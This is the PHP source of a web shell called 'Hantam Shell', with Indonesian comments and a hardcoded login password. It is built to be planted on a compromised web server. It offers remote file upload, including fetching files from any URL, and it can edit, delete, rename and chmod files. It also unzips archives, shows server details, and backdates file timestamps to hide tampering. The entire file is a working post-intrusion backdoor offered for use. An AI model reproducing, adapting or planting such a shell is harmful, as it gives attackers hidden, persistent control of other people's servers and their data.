<?php
session_start();
error_reporting(0);

// === Logout ===
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Password Auth ===
$panel_password = 'kucing123';
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['panel_pass']) && $_POST['panel_pass'] === $panel_password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    echo '<form method="post" style="margin:100px auto;text-align:center;font-family:sans-serif;">
        <input type="password" name="panel_pass" placeholder="Password" style="padding:5px;font-size:10px;">
        <button type="submit" style="padding:5px 10px;font-size:10px;">Login</button>
    </form>';
    exit;
}

// === Change Directory ===
if (isset($_GET['cd']) && is_dir($_GET['cd'])) {
    chdir($_GET['cd']);
}
$currentDir = getcwd();

// === Upload File ===
if (isset($_POST['do_upload']) && isset($_FILES['upload_file'])) {
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['name']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Upload from URL ===
if (isset($_POST['do_url_upload']) && isset($_POST['upload_url'])) {
    $url = $_POST['upload_url'];
    $name = basename(parse_url($url, PHP_URL_PATH));
    file_put_contents($name, file_get_contents($url));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Delete File/Folder ===
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Rename File/Folder ===
if (isset($_POST['rename_old'], $_POST['rename_new'])) {
    rename($_POST['rename_old'], $_POST['rename_new']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Edit File ===
if (isset($_GET['edit']) && is_file($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    if (isset($_POST['file_content'])) {
        file_put_contents($fileToEdit, $_POST['file_content']);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    $content = htmlspecialchars(file_get_contents($fileToEdit));
    ?>
    <style>
        body {
            background: #1e1e2f;
            color: #ccc;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        textarea {
            width: 100%;
            height: 80vh;
            background: #2a2a3b;
            color: #eee;
            border: 1px solid #444;
            font-family: monospace;
            padding: 10px;
            font-size: 14px;
        }
        button {
            background: #4ea8ff;
            color: white;
            padding: 10px 20px;
            border: none;
            margin-top: 10px;
            cursor: pointer;
        }
        button:hover {
            background: #368fd1;
        }
        a {
            color: #ff6666;
            text-decoration: none;
        }
    </style>
    <h2>Editing File: <?= htmlspecialchars($fileToEdit) ?></h2>
    <form method="post">
        <textarea name="file_content"><?= $content ?></textarea><br>
        <button type="submit">Save</button> |
        <a href="<?= $_SERVER['PHP_SELF'] ?>">Cancel</a>
    </form>
    <?php
    exit;
}

// === CHMOD ===
if (isset($_POST['chmod_target'], $_POST['chmod_value'])) {
    chmod($_POST['chmod_target'], octdec($_POST['chmod_value']));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Change File Date ===
if (isset($_POST['chdate_target'], $_POST['chdate_value'])) {
    touch($_POST['chdate_target'], strtotime($_POST['chdate_value']));
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Create File ===
if (isset($_POST['create_file']) && $_POST['create_file_name']) {
    $newFile = $_POST['create_file_name'];
    if (!file_exists($newFile)) file_put_contents($newFile, '');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Create Folder ===
if (isset($_POST['create_folder']) && $_POST['create_folder_name']) {
    $newFolder = $_POST['create_folder_name'];
    if (!file_exists($newFolder)) mkdir($newFolder);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Unzip ZIP File ===
if (isset($_GET['unzip'])) {
    $zipFile = $_GET['unzip'];
    if (file_exists($zipFile) && preg_match('/\.zip$/i', $zipFile)) {
        $zip = new ZipArchive;
        if ($zip->open($zipFile) === TRUE) {
            $extractPath = pathinfo($zipFile, PATHINFO_FILENAME);
            if (!is_dir($extractPath)) {
                mkdir($extractPath);
            }
            $zip->extractTo($extractPath);
            $zip->close();
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Style dan Header ===
?>
<style>
<?php // paste style dari sebelumnya, sama persis ?>
/* (tidak diulangi di sini untuk singkat, kamu bisa copy ulang dari versi sebelumnya yang sudah kamu pakai) */
</style>

<h2>♝Hantam Shell</h2>
<div style='text-align:right; margin-bottom:10px;'><a href='?logout' style='color:#ff6666;'>Logout</a></div>

<?php
// === Info Server ===
$ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$user = get_current_user();
$system = php_uname();
$phpVer = PHP_VERSION;
$software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
echo "<div style='background:#2a2a3b;padding:15px;margin-bottom:15px;border:1px solid #444;font-size:14px;'>
    <strong>Information Server</strong><br>
    IP : $ip<br>
    System : $system<br>
    User : $user<br>
    PHP Version : $phpVer<br>
    Software : $software
</div>";

// === Breadcrumb ===
echo "<div class='breadcrumb'>📁 Dir: ";
$parts = explode(DIRECTORY_SEPARATOR, $currentDir);
$path = "";
foreach ($parts as $part) {
    if ($part === "") continue;
    $path .= "/" . $part;
    echo "<a href='?cd=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
}
echo "</div>";

// === Top Tools ===
echo <<<TOOLS
<div class="top-tools">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file">
        <button type="submit" name="do_upload">Upload</button>
    </form>
    <form method="post">
        <input type="text" name="upload_url" placeholder="URL file">
        <button type="submit" name="do_url_upload">Upload From URL</button>
    </form>
    <form method="post">
        <input type="text" name="create_file_name" placeholder="Nama File">
        <button type="submit" name="create_file">Create File</button>
    </form>
    <form method="post">
        <input type="text" name="create_folder_name" placeholder="Nama Folder">
        <button type="submit" name="create_folder">Create Folder</button>
    </form>
</div>
TOOLS;

// === Tabel File Manager ===
echo "<table>
    <thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>";
echo "<tr>
    <td>📁 <a href='?cd=" . urlencode(dirname($currentDir)) . "'>..</a></td>
    <td>-</td>
    <td>" . date("F d Y H:i:s", filemtime("..")) . "</td>
    <td class='perm-other'>" . substr(sprintf('%o', fileperms("..")), -4) . "</td>
    <td><a href='?cd=" . urlencode(dirname($currentDir)) . "'>Select</a></td>
</tr>";

$folders = $files = [];
foreach (scandir('.') as $file) {
    if ($file === ".") continue;
    if (is_dir($file)) $folders[] = $file; else $files[] = $file;
}
sort($folders); sort($files);
$allItems = array_merge($folders, $files);

foreach ($allItems as $file) {
    $isDir = is_dir($file);
    $size = $isDir ? '-' : formatSize(filesize($file));
    $mtime = date("F d Y H:i:s", filemtime($file));
    $perms = substr(sprintf('%o', fileperms($file)), -4);
    $permClass = in_array($perms, ['0755','0644','0711']) ? 'perm-0755' :
                 ($perms === '0777' ? 'perm-0777' :
                 (in_array($perms, ['0444','0555']) ? 'perm-0444' : 'perm-other'));
    $icon = $isDir ? '📁' : (preg_match('/\\.php$/i', $file) ? '🐘' :
             (preg_match('/\\.html?$/i', $file) ? '🌐' :
             (preg_match('/\\.txt$/i', $file) ? '📄' : '📦')));
    $nameDisplay = "$icon " . ($isDir ? "<a href='?cd=" . urlencode($file) . "'>$file</a>" : $file);
    echo "<tr>
        <td>$nameDisplay</td>
        <td>$size</td>
        <td>$mtime</td>
        <td class='$permClass'>$perms</td>
        <td>
            <details><summary>Select</summary>
                <a href='?edit=" . urlencode($file) . "'>Edit</a><br>
                <form method='post'>
                    <input type='hidden' name='rename_old' value='$file'>
                    <input type='text' name='rename_new' value='$file' size='10'>
                    <button type='submit'>Rename</button>
                </form><br>
                <form method='post'>
                    <input type='hidden' name='chmod_target' value='$file'>
                    <input type='text' name='chmod_value' size='4' placeholder='0644'>
                    <button type='submit'>CHMOD</button>
                </form><br>
                <form method='post'>
                    <input type='hidden' name='chdate_target' value='$file'>
                    <input type='text' name='chdate_value' size='16' placeholder='2025-07-20 13:00'>
                    <button type='submit'>ChDate</button>
                </form><br>
                <a href='?del=" . urlencode($file) . "' onclick=\"return confirm('Hapus $file?');\">Delete</a><br>";
    if (!$isDir) echo "<a href='$file' download>Download</a><br>";
    if (!$isDir && preg_match('/\\.zip$/i', $file)) echo "<a href='?unzip=" . urlencode($file) . "'>Unzip</a>";
    echo "</details></td></tr>";
}
echo "</tbody></table>";

echo "<div style='text-align:center; margin-top:30px; font-size:13px; color:#888;'>2025 © Hantam Shell | Created By Njun.</div>";

// === Size Formatting ===
function formatSize($bytes) {
    $sizes = array('B','KB','MB','GB','TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($sizes)-1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes,2) . ' ' . $sizes[$i];
}
?>
